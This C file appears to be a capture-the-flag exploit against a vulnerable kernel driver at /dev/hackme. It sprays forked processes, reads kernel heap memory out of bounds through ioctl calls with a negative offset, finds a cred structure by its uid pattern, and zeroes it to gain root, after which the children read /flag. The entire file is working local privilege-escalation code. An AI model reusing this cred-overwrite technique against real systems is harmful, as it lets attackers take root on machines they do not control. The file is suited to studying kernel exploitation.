#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#define limit 0x10000
void wait_and_check(){
	while(1){
		if(getuid()==0){
			system("id;cat /flag");
			exit(0);
		}
		//puts("alive");
		sleep(1);
	}
}

int myMemmem(char * a, int alen, char * b, int blen)
{
	int i, j;
	for (i = 0; i <= alen - blen; ++ i)
	{
		for (j = 0; j < blen; ++ j)
		{
			if (a[i + j] != b[j])
			{
				break;
			}
		}
		if (j >= blen)
		{
			return i;
		}
	}
	return -1;
}

void print_hex(char *buf,int size){
	int i;
	puts("======================================");
	printf("data :\n");
	for (i=0 ; i<(size/8);i++){
		if (i%2 == 0){
			printf("%d",i/2);
		}
		printf(" %16llx",*(size_t * )(buf + i*8));
		if (i%2 == 1){
			printf("\n");
		}		
	}
	puts("======================================");
}


struct arg
{
	size_t idx;
	void *addr;
	long long len;
	long long offset;
};

int main(){
	char *mem = malloc(0x100);
	int fd = open("/dev/hackme", 0);
	if (fd < 0){
		printf("[-] bad open /dev/hackme\n");
		exit(-1);
	}
	struct arg argv;
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0); 
	// start a malloc
	argv.idx = 0;	
	argv.len=0x80;
	argv.addr = mem;
	argv.offset = 0;
	ioctl(fd,0x30000,&argv);
	
	for(int i =0;i<0xff;i++ ){
		if(fork()==0){
			wait_and_check();
		}
		/*
		pthread_t t1;
		pthread_create(&t1, NULL, wait_and_check,NULL);
		*/
	}
	puts("[+] cred spary finished");
	
	// start a malloc
	argv.idx = 1;	
	argv.len=0x80;
	argv.addr = mem;
	argv.offset = 0;
	ioctl(fd,0x30000,&argv);
	// start search memory
	char *big_mem = malloc(0x154500);
	if(big_mem<=0){
		puts("[-] bad malloc");
		exit(-1);
	}
	memset(big_mem,0,0x154500);
	argv.idx = 1;	
	argv.len=0x80;
	argv.addr = big_mem;
	argv.offset = -0x154500;
	ioctl(fd,0x30003,&argv);
	//print_hex(big_mem,0x154500);
	char cred[0x20];
	*(size_t *)cred = 0x000003e800000001;
	*(size_t *)(cred+8) = 0x000003e8000003e8;
	*(size_t *)(cred+0x10) = 0x000003e8000003e8;
	*(size_t *)(cred+0x18) = 0x000003e8000003e8;
	int idx = myMemmem(big_mem,0x154500,cred,8);
	if(idx==-1){
		puts("[-]bad find");
		exit(-1);
	}
	printf("[+] found in %d\n",idx);
	print_hex(big_mem+idx,80);
	*(size_t *)(big_mem+idx) = 0x0000000000000001;
	*(size_t *)(big_mem+idx+8) = 0x0000000000000000;
	*(size_t *)(big_mem+idx+0x10) = 0x0000000000000000;
	*(size_t *)(big_mem+idx+0x18) = 0x0000000000000000;	
	print_hex(big_mem+idx,80);
	argv.idx = 1;	
	argv.len=0x154500;
	argv.addr = big_mem;
	argv.offset = -0x154500;
	ioctl(fd,0x30002,&argv);

	sleep(5);
	system("id");
	return 0;
}